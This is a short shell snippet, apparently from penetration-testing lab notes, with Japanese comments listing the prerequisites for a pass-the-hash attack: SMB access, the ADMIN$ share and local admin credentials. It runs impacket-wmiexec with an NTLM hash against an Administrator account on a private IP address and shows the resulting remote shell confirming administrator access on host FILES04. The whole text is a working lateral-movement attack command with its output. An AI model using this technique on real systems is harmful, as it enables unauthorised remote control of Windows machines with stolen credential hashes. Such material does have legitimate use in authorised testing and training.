```sh
# SMB接続（通常はポート445）が必要
# ADMIN$共有が利用可能であることが必要
# ローカル管理権限を持つ有効な資格情報が必要
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
# Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
# 
# [*] SMBv3.0 dialect used
# [!] Launching semi-interactive shell - Careful what you execute
# [!] Press help for extra shell commands
# C:\>hostname
# FILES04
# 
# C:\>whoami
# files04\administrator

```